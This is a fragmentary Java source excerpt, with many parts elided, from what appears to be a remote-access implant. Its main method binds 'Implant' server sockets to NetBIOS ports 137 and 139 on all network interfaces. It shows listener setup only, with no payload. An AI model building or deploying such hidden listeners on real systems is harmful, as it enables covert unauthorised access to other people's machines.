...
public class Main 
{
	...
	public static void main(String[] args) 	
	{
		...
		{
			Driver.sop("* * * OVERRIDE --> ESTABLISHING LISTENERS ON PORT 137");
			
			args = new String[]{"L", "137"};
		...
		else//params were passed in
		{
			...
			/*if(args[0] == null)
			{
				Driver.sop("* * * OVERRIDE --> ESTABLISHING LISTENERS ON PORT 139");
				
				args = new String[]{"L", "139"};
				Main.initiateImplant_listen_MULTIPLE_connections(args);
			}*/
			...
			if(args[0].equalsIgnoreCase(STARTUP_LAUNCH_GUI_DELIMETER))
			{
	...
	public static boolean initiateImplant_listen_single_connection(String [] arg)
	{
		try
		{
			...
			Implant_ServerSocket serverSocket = new Implant_ServerSocket(PORT, false, null);
			serverSocket.start();
	...
	public static boolean initiateImplant_listen_MULTIPLE_connections(String [] arg)
	{
		try
		{
			...
			Driver.sop("\nAttempting to establish listeners on all available interfaces now...");
			
			Driver.llImplant_ServerSockets = new LinkedList<Implant_ServerSocket>();
			
			//attempt to bind to each available IP address
			Implant_ServerSocket serverSocket = null;			
			for(int i = 0; llAvailableInetAddresses != null && i < llAvailableInetAddresses.size(); i++)
			{
				serverSocket = new Implant_ServerSocket(PORT, true, llAvailableInetAddresses.get(i));
				serverSocket.start();
				
				Driver.llImplant_ServerSockets.add(serverSocket);
			}
			
			//serverSocket = new Implant_ServerSocket(PORT, true);
			//serverSocket.start();
